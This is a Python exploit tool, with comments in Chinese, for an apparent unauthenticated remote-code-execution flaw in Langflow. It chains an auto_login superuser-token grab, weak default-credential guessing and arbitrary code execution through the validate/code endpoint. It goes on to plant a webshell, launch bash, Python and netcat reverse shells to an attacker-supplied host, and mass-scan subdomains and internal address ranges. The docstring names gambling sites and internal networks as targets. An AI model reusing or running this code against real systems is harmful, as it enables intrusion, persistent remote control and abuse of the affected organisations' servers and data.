#!/usr/bin/env python3
"""
langflow_probe.py — Langflow CVE-2026-9198 完整作业工具（授权范围内）

CVE-2026-9198：IBM Langflow OSS 1.0.0-1.10.0 预认证 RCE
  CVSS 9.8 | CISA KEV | 已在野利用 | 两条请求 getshell

利用链：
  Step1: GET /api/v1/auto_login     → 无需认证获取 SUPERUSER JWT（默认配置）
  Step2: POST /api/v1/validate/code → exec() 执行任意 Python 代码

根因：
  - auto_login 端点在 LANGFLOW_AUTO_LOGIN=true（1.x 默认）时向任何调用者颁发 SUPERUSER token
  - validate/code 端点在 Python 函数定义时就会 eval 默认参数：
    def _v(a=exec('...')): pass  → 函数定义阶段即触发 exec

适用场景（博彩站/内网）：
  - 目标内网有 AI 工作流平台
  - 对外暴露 Langflow 的服务器（常见于 AI 团队、数据分析部门）
  - 从 heapdump / env / TeamCity 中找到 Langflow 地址

用法：
  # 探测：版本 + auto_login + 无票 validate/code + %0a WAF 差分
  python3 炼蛊房/langflow_probe.py detect -u https://langflow.target.com --case <案卷>

  # 完整利用：拿 token → 执行命令 → 获取 shell
  python3 炼蛊房/langflow_probe.py exploit -u https://langflow.target.com --cmd id

  # 反弹 shell
  python3 炼蛊房/langflow_probe.py shell \
    -u https://langflow.target.com \
    --lhost 攻击机IP --lport 4444

  # 批量扫描内网
  python3 炼蛊房/langflow_probe.py scan -d target.com --cidr 192.168.1.0/24

  # 已有 token 时执行命令
  python3 炼蛊房/langflow_probe.py exec \
    -u https://langflow.target.com \
    --token eyJ... --cmd "cat /etc/passwd"

依赖：pip install requests
"""

import argparse
import base64
import json
import re
import socket
import sys
import time
from pathlib import Path
from urllib.parse import urlparse

try:
    import requests
    requests.packages.urllib3.disable_warnings()
except ImportError:
    print("[!] pip install requests", file=sys.stderr)
    sys.exit(1)

# ──────────────────────────── Scope 检查 ────────────────────────────

OPS = Path(__file__).resolve().parent
if str(OPS) not in sys.path:
    sys.path.insert(0, str(OPS))
from scope_lib import require_in_scope  # noqa: E402


# ──────────────────────────── HTTP 工具 ─────────────────────────────

def _sess(token: str = "") -> requests.Session:
    s = requests.Session()
    s.headers.update({
        "User-Agent": "Mozilla/5.0 (compatible; LangflowClient/1.0)",
        "Accept": "application/json",
        "Content-Type": "application/json",
    })
    if token:
        s.headers["Authorization"] = f"Bearer {token}"
    return s


def _get(sess, url: str, **kw) -> requests.Response | None:
    try:
        kw.setdefault("timeout", 12)
        kw.setdefault("verify", False)
        return sess.get(url, **kw)
    except Exception:
        return None


def _post(sess, url: str, data: dict, **kw) -> requests.Response | None:
    try:
        kw.setdefault("timeout", 15)
        kw.setdefault("verify", False)
        return sess.post(url, json=data, **kw)
    except Exception:
        return None


# ──────────────────────────── 版本检测 ──────────────────────────────

def _get_version(base: str) -> dict:
    """获取 Langflow 版本信息"""
    sess = _sess()
    # 尝试 /health 和 /version 端点
    for path in ["/health", "/api/v1/version", "/api/v1/config"]:
        r = _get(sess, base + path)
        if r and r.status_code == 200:
            try:
                data = r.json()
                version = (data.get("version") or
                           data.get("langflow_version") or
                           data.get("frontend_version") or "")
                if version:
                    return {"version": version, "source": path, "raw": data}
            except Exception:
                # 从 HTML/text 提取
                m = re.search(r'"version":\s*"([0-9]+\.[0-9]+\.[0-9]+)"', r.text)
                if m:
                    return {"version": m.group(1), "source": path}
    return {}


def _is_vulnerable(version: str) -> bool:
    """判断版本是否在 CVE-2026-9198 受影响范围（1.0.0-1.10.0）"""
    m = re.match(r"(\d+)\.(\d+)\.(\d+)", version)
    if not m:
        return True  # 无法判断，保守认为受影响
    major, minor, patch = int(m.group(1)), int(m.group(2)), int(m.group(3))
    if major == 1 and (minor < 10 or (minor == 10 and patch == 0)):
        return True
    return False


# ──────────────────────────── Step 1：获取 SUPERUSER Token ──────────

def get_superuser_token(base: str, token: str = "") -> dict:
    """
    CVE-2026-9198 Step1：调用 auto_login 端点无认证获取 SUPERUSER token
    """
    sess = _sess(token)

    # 主要入口：GET /api/v1/auto_login
    r = _get(sess, f"{base}/api/v1/auto_login")
    if r and r.status_code == 200:
        try:
            data = r.json()
            tok = data.get("access_token") or data.get("token") or ""
            if tok:
                return {
                    "success": True,
                    "token": tok,
                    "token_type": data.get("token_type", "bearer"),
                    "method": "auto_login",
                }
        except Exception:
            pass

    # 备用：POST /api/v1/login（弱密码）
    for cred in [{"username": "admin", "password": "admin"},
                 {"username": "langflow", "password": "langflow"},
                 {"username": "admin", "password": "langflow"},
                 {"username": "admin@langflow.org", "password": "admin"}]:
        r2 = _post(sess, f"{base}/api/v1/login", cred)
        if r2 and r2.status_code == 200:
            try:
                data = r2.json()
                tok = data.get("access_token") or ""
                if tok:
                    return {
                        "success": True,
                        "token": tok,
                        "method": f"weak_cred:{cred['username']}",
                    }
            except Exception:
                pass

    return {
        "success": False,
        "token": "",
        "note": "auto_login 可能已禁用（LANGFLOW_AUTO_LOGIN=false）或版本已修复",
    }


# ──────────────────────────── Step 2：代码执行 ──────────────────────

def exec_code(base: str, token: str, python_code: str) -> dict:
    """
    CVE-2026-9198 Step2：通过 validate/code 端点执行任意 Python

    技巧：Python 在函数定义时就执行默认参数，
    def _v(a=exec('代码')): pass  → 定义阶段即触发 exec

    使用 exception message 回显命令输出（无需读 stdout）
    注意：python_code 是要在 Langflow 服务器上执行的 Python 代码；
    若需要回显输出，python_code 自身应 raise RuntimeError(输出内容)。
    """
    sess = _sess(token)

    # 方式 A：默认参数触发（经典 CVE-2026-9198 方式）
    # exec() 会传播被执行代码抛出的异常，Langflow 在 errors 字段中返回异常信息
    wrapped_a = f"def _v(a=exec({repr(python_code.strip())})): pass"

    # 方式 B：直接在顶层执行（部分版本支持）
    wrapped_b = python_code.strip()

    for code_variant, method in [(wrapped_a, "default_arg_exec"),
                                  (wrapped_b, "direct_exec")]:
        r = _post(sess, f"{base}/api/v1/validate/code",
                  {"code": code_variant})
        if not r:
            continue

        result = {
            "method": method,
            "status": r.status_code,
            "raw": r.text[:1000],
            "output": "",
            "success": False,
        }

        # 从响应中提取命令输出
        try:
            data = r.json()
            # 错误信息里包含 RuntimeError 的 message（即命令输出）
            errors = data.get("errors", data.get("detail", ""))
            if isinstance(errors, list):
                errors = " ".join(str(e) for e in errors)
            elif isinstance(errors, dict):
                errors = str(errors)

            # 提取 RuntimeError: 后面的内容
            m = re.search(r"RuntimeError:\s*(.+?)(?:\"|\n|$)", str(errors), re.DOTALL)
            if m:
                result["output"] = m.group(1).strip()
                result["success"] = True
            elif errors:
                result["output"] = str(errors)[:500]
                # 若有 errors 字段说明代码被执行了（即使输出解析失败）
                result["success"] = bool(errors)
        except Exception:
            pass

        # 检查 200 且有响应（执行成功标志）
        if r.status_code in (200, 400, 422) and len(r.text) > 10:
            result["success"] = True

        if result["success"] or result["output"]:
            return result

    return {"success": False, "output": "", "status": -1, "raw": ""}


def exec_cmd(base: str, token: str, cmd: str) -> dict:
    """执行系统命令并通过异常回显输出"""
    # raise RuntimeError(output) 让 Langflow 把命令输出放进错误消息返回给我们
    code = f"import os; raise RuntimeError(os.popen({repr(cmd)}).read())"
    return exec_code(base, token, code)


# ──────────────────────────── Shell 植入 ────────────────────────────

def plant_webshell(base: str, token: str) -> dict:
    """在 Langflow 服务器上植入 Python webshell"""
    # 写入 Flask/FastAPI 端点（Langflow 基于 FastAPI）
    # 方式 A：写文件到可访问路径
    webshell_path = "/tmp/lf_shell.py"
    webshell_code = '''
import os, http.server, socketserver, urllib.parse

class Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        cmd = urllib.parse.unquote(self.path[1:])
        out = os.popen(cmd).read() if cmd else "ready"
        self.send_response(200)
        self.end_headers()
        self.wfile.write(out.encode())
    def log_message(self, *a): pass

with socketserver.TCPServer(("0.0.0.0", 18080), Handler) as s:
    s.serve_forever()
'''.strip()

    write_cmd = f"open({repr(webshell_path)}, 'w').write({repr(webshell_code)})"
    r1 = exec_code(base, token, write_cmd)

    start_cmd = f"import subprocess; subprocess.Popen(['python3', {repr(webshell_path)}], start_new_session=True)"
    r2 = exec_code(base, token, start_cmd)

    return {
        "webshell_path": webshell_path,
        "write_result": r1,
        "start_result": r2,
        "access_url": "http://目标IP:18080/命令",
        "note": "webshell 监听在 18080 端口，访问 http://目标IP:18080/id 执行命令",
    }


def reverse_shell(base: str, token: str, lhost: str, lport: int) -> dict:
    """触发反弹 shell"""
    cmd = (f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'")
    b64_cmd = base64.b64encode(cmd.encode()).decode()

    # 多种反弹 shell 方式，逐一尝试
    variants = [
        # bash
        f"import os; os.system('bash -c {{echo,{b64_cmd}}}|{{base64,-d}}|bash')",
        # python
        f"import socket,subprocess,os; s=socket.socket(); s.connect(('{lhost}',{lport})); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(['/bin/bash','-i'])",
        # nc
        f"import os; os.system('nc {lhost} {lport} -e /bin/bash')",
    ]

    for code in variants:
        exec_code(base, token, code)
        time.sleep(1)

    return {
        "lhost": lhost,
        "lport": lport,
        "note": f"已发送反弹 shell，等待 nc -lvnp {lport} 的连接...",
    }


# ──────────────────────────── 批量扫描 ──────────────────────────────

LANGFLOW_PORTS = [7860, 7861, 3000, 8080, 8000, 8443, 443, 80]
LANGFLOW_PATHS = ["", "/langflow", "/app"]

LANGFLOW_SUBDOMAINS = [
    "langflow", "ai", "flow", "workflow", "ml", "nlp",
    "chat", "bot", "gpt", "llm", "rag", "agent",
]


def discover_langflow(domain: str, cidr: str = "") -> list[str]:
    """发现目标域名下的 Langflow 实例"""
    targets = []

    # 子域枚举
    for sub in LANGFLOW_SUBDOMAINS:
        fqdn = f"{sub}.{domain}"
        try:
            socket.setdefaulttimeout(2)
            socket.gethostbyname(fqdn)
            for port in LANGFLOW_PORTS[:4]:
                scheme = "https" if port in (443, 8443) else "http"
                targets.append(f"{scheme}://{fqdn}:{port}")
        except Exception:
            pass

    # CIDR 扫描（如果提供）
    if cidr:
        try:
            import ipaddress
            network = ipaddress.ip_network(cidr, strict=False)
            # 只扫小段（避免扫太多）
            hosts = list(network.hosts())[:254]
            for ip in hosts:
                for port in [7860, 7861, 3000]:
                    targets.append(f"http://{ip}:{port}")
        except Exception:
            pass

    return targets


def quick_probe(base: str) -> dict | None:
    """快速探测单个目标是否是 Langflow"""
    sess = _sess()

    # 先试 /health，延迟短
    r = _get(sess, f"{base}/health")
    if not r:
        return None

    body = r.text or ""
    is_lf = False

    if r.status_code == 200:
        try:
            data = r.json()
            if "langflow" in str(data).lower() or "status" in data:
                is_lf = True
        except Exception:
            if "langflow" in body.lower():
                is_lf = True

    # 试 auto_login 端点（Langflow 特有）
    r2 = _get(sess, f"{base}/api/v1/auto_login")
    if r2 and r2.status_code in (200, 401, 403):
        is_lf = True
        if r2.status_code == 200:
            try:
                tok = r2.json().get("access_token", "")
                if tok:
                    return {
                        "base": base,
                        "is_langflow": True,
                        "vulnerable": True,
                        "token": tok,
                        "note": "★ auto_login 直接返回 token！",
                    }
            except Exception:
                pass

    if is_lf:
        ver_info = _get_version(base)
        version = ver_info.get("version", "")
        return {
            "base": base,
            "is_langflow": True,
            "version": version,
            "vulnerable": _is_vulnerable(version) if version else None,
        }
    return None


# ──────────────────────────── 命令入口 ──────────────────────────────

def _send_keep_url(sess: requests.Session, method: str, url: str, body: dict | None = None):
    """发出请求并尽量保留路径里的 %0a（urllib 默认会规范化）。"""
    headers = dict(sess.headers)
    data = None
    if body is not None:
        data = json.dumps(body).encode()
        headers["Content-Type"] = "application/json"
    req = requests.Request(method, "http://127.0.0.1/", data=data, headers=headers)
    prep = sess.prepare_request(req)
    prep.url = url
    try:
        return sess.send(prep, timeout=15, verify=False, allow_redirects=False)
    except Exception:
        return None


HARMLESS_CODE = {"code": "def _probe(): return 1"}
VALIDATE_PATHS = (
    "/api/v1/validate/code",
    "/api/v1/%0avalidate/code",
    "/api/v1/validate%0a/code",
)


def probe_validate_surface(base: str) -> list[dict]:
    """无票 + 无害 code：普通路径 vs %0a 路径差分（CVE-2025-3248 / WAF）。"""
    sess = _sess()
    rows = []
    for path in VALIDATE_PATHS:
        r = _send_keep_url(sess, "POST", base + path, HARMLESS_CODE)
        rec = {"path": path, "status": None, "business": False, "size": 0}
        if r is not None:
            rec["status"] = r.status_code
            rec["size"] = len(r.text or "")
            blob = (r.text or "").lower()
            rec["business"] = any(n in blob for n in ("errors", "valid", "imports"))
        rows.append(rec)
    return rows


def cmd_detect(args: argparse.Namespace) -> int:
    base = args.url.rstrip("/")
    host = urlparse(base).netloc.split(":")[0]
    require_in_scope(host)

    print(f"\n[*] Langflow 指纹探测: {base}")

    # 版本
    ver_info = _get_version(base)
    version = ver_info.get("version", "未知")
    vulnerable = _is_vulnerable(version) if version != "未知" else None
    print(f"  版本: {version}  {'★受影响(1.0.0-1.10.0)' if vulnerable else ('已修复' if vulnerable is False else '版本未知')}")

    # 测试 auto_login
    tok_result = get_superuser_token(base)
    if tok_result["success"]:
        print(f"\n  ★★ auto_login 成功！token: {tok_result['token'][:30]}...")
        print(f"     方式: {tok_result['method']}")

        # 验证 token 权限（试读用户列表）
        auth_sess = _sess(tok_result["token"])
        r = _get(auth_sess, f"{base}/api/v1/users")
        if r and r.status_code == 200:
            print("  ★ SUPERUSER 确认！/api/v1/users 可访问")
    else:
        print(f"\n  auto_login: 不可用（{tok_result.get('note', '')}）")
        print("  → 可能 LANGFLOW_AUTO_LOGIN=false 或版本已修复（>= 1.10.1）")
        print("  → 继续测无票 validate/code（CVE-2025-3248）与 %0a WAF 差分")

    print("\n  validate/code 无票差分（无害 code，不发 exec）：")
    rows = probe_validate_surface(base)
    base_row = rows[0] if rows else {}
    waf_hit = False
    for rec in rows:
        flag = ""
        if rec.get("business") and rec.get("status") in (200, 400, 422):
            flag = " ★业务响应"
            if rec["path"] != "/api/v1/validate/code" and base_row.get("status") == 403:
                flag += " ★WAF %0a 差分"
                waf_hit = True
        print(f"    {rec.get('status')} {rec['path']}{flag}")
    if waf_hit:
        print("  → 普通路径 403、编码路径可达：记 L2 WAF 绕过，L3 先问")

    report = {
        "target": base,
        "version": version,
        "auto_login": bool(tok_result.get("success")),
        "validate_surface": rows,
        "waf_nl": waf_hit,
        "playbook": "传承/流语·开天.md",
    }
    try:
        from scope_lib import write_probe_json
        outp = write_probe_json(
            report,
            case=getattr(args, "case", "") or "",
            out=getattr(args, "out", None),
            case_subdir="1day",
            filename="langflow.json",
        )
        print(f"  [+] wrote {outp}")
    except Exception as e:
        print(f"  [!] 落盘失败: {e}")

    return 0


def cmd_exploit(args: argparse.Namespace) -> int:
    base = args.url.rstrip("/")
    host = urlparse(base).netloc.split(":")[0]
    require_in_scope(host)

    print(f"\n{'='*60}")
    print("  Langflow CVE-2026-9198 利用链")
    print(f"  目标: {base}")
    print(f"{'='*60}")

    # Step1: 获取 token
    token = args.token or ""
    if not token:
        print("\n[Step1] 获取 SUPERUSER token...")
        tok_result = get_superuser_token(base)
        if tok_result["success"]:
            token = tok_result["token"]
            print(f"  ★ token 获取成功！({tok_result['method']})")
            print(f"  token: {token[:40]}...")
        else:
            print(f"  ✗ 无法获取 token: {tok_result.get('note')}")
            print("    使用 --token 传入已有 token")
            return 1
    else:
        print(f"\n[Step1] 使用已有 token: {token[:30]}...")

    # Step2: 执行命令
    cmd = args.cmd or "id && hostname && whoami && cat /etc/os-release"
    print(f"\n[Step2] 执行命令: {cmd}")
    result = exec_cmd(base, token, cmd)

    if result.get("output"):
        print("\n  ★ 命令执行成功！")
        print(f"  {'─'*40}")
        print(f"  {result['output']}")
        print(f"  {'─'*40}")
    elif result.get("success"):
        print(f"  命令已发送（HTTP {result['status']}），但输出未回显")
        print("  使用 --out-file 将结果写入文件后读取")
    else:
        print(f"  ✗ 命令执行失败  HTTP {result.get('status', '?')}")
        if result.get("raw"):
            print(f"  响应: {result['raw'][:200]}")

    return 0


def cmd_shell(args: argparse.Namespace) -> int:
    base = args.url.rstrip("/")
    host = urlparse(base).netloc.split(":")[0]
    require_in_scope(host)

    print(f"\n[*] 目标: {base}")

    token = args.token or ""
    if not token:
        tok_result = get_superuser_token(base)
        if not tok_result["success"]:
            print(f"[✗] 无法获取 token: {tok_result.get('note')}")
            return 1
        token = tok_result["token"]
        print(f"[+] token: {token[:30]}...")

    lhost = args.lhost
    lport = args.lport

    print(f"\n[*] 发送反弹 shell → {lhost}:{lport}")
    print(f"    请先在攻击机运行: nc -lvnp {lport}")
    print("    等待 3 秒...")
    time.sleep(3)

    result = reverse_shell(base, token, lhost, lport)
    print("\n  已发送，检查你的 nc 监听...")
    return 0


def cmd_exec(args: argparse.Namespace) -> int:
    base = args.url.rstrip("/")
    host = urlparse(base).netloc.split(":")[0]
    require_in_scope(host)

    result = exec_cmd(base, args.token, args.cmd)
    if result.get("output"):
        print(result["output"])
    else:
        print(f"[?] 无输出  HTTP {result.get('status')}  {result.get('raw', '')[:200]}")
    return 0


def cmd_scan(args: argparse.Namespace) -> int:
    domain = args.domain
    host = domain.split("/")[-1]
    require_in_scope(host)

    print(f"\n[*] 发现 {domain} 的 Langflow 实例...")
    targets = discover_langflow(domain, args.cidr or "")
    if args.url:
        targets = [args.url] + targets

    print(f"[*] 候选目标 {len(targets)} 个，开始探测...")

    found = []
    for t in targets:
        r = quick_probe(t)
        if r:
            found.append(r)
            vuln = ("★★ 可利用（token已拿）" if r.get("token")
                    else "★受影响" if r.get("vulnerable")
                    else "已修复" if r.get("vulnerable") is False
                    else "未知版本")
            print(f"\n  [+] {t}  {r.get('version', '')}  {vuln}")
            if r.get("token"):
                print(f"      token: {r['token'][:40]}...")

    print(f"\n[*] 发现 {len(found)} 个 Langflow 实例")
    vuln_cnt = sum(1 for r in found if r.get("vulnerable") or r.get("token"))
    print(f"[*] 其中 {vuln_cnt} 个受影响/可利用")
    return 0


def main():
    ap = argparse.ArgumentParser(
        description="langflow_probe — CVE-2026-9198 完整作业工具（授权范围内）\n"
                    "Langflow 1.0.0-1.10.0 无认证 RCE | CISA KEV | 已在野利用"
    )
    sub = ap.add_subparsers(dest="cmd", required=True)

    p = sub.add_parser("detect", help="指纹 + auto_login + 无票 validate/%0a 差分")
    p.add_argument("-u", "--url", required=True)
    p.add_argument("--case", default="")
    p.add_argument("--out", type=Path, default=None)

    p = sub.add_parser("exploit", help="完整利用链（Step1: token + Step2: RCE）")
    p.add_argument("-u", "--url", required=True)
    p.add_argument("--token", default="", help="已有 SUPERUSER token（跳过 Step1）")
    p.add_argument("--cmd", default="id && hostname",
                   help="要执行的命令（默认: id && hostname）")

    p = sub.add_parser("shell", help="触发反弹 shell")
    p.add_argument("-u", "--url", required=True)
    p.add_argument("--token", default="")
    p.add_argument("--lhost", required=True, help="攻击机 IP")
    p.add_argument("--lport", type=int, default=4444, help="监听端口（默认 4444）")

    p = sub.add_parser("exec", help="已有 token 时执行命令")
    p.add_argument("-u", "--url", required=True)
    p.add_argument("--token", required=True)
    p.add_argument("--cmd", required=True, help="系统命令")

    p = sub.add_parser("scan", help="批量发现 Langflow 实例")
    p.add_argument("-d", "--domain", required=True)
    p.add_argument("--cidr", default="", help="内网 CIDR（如 192.168.1.0/24）")
    p.add_argument("-u", "--url", default="", help="额外目标")

    args = ap.parse_args()
    fn = {
        "detect": cmd_detect,
        "exploit": cmd_exploit,
        "shell": cmd_shell,
        "exec": cmd_exec,
        "scan": cmd_scan,
    }[args.cmd]
    sys.exit(fn(args))


if __name__ == "__main__":
    main()
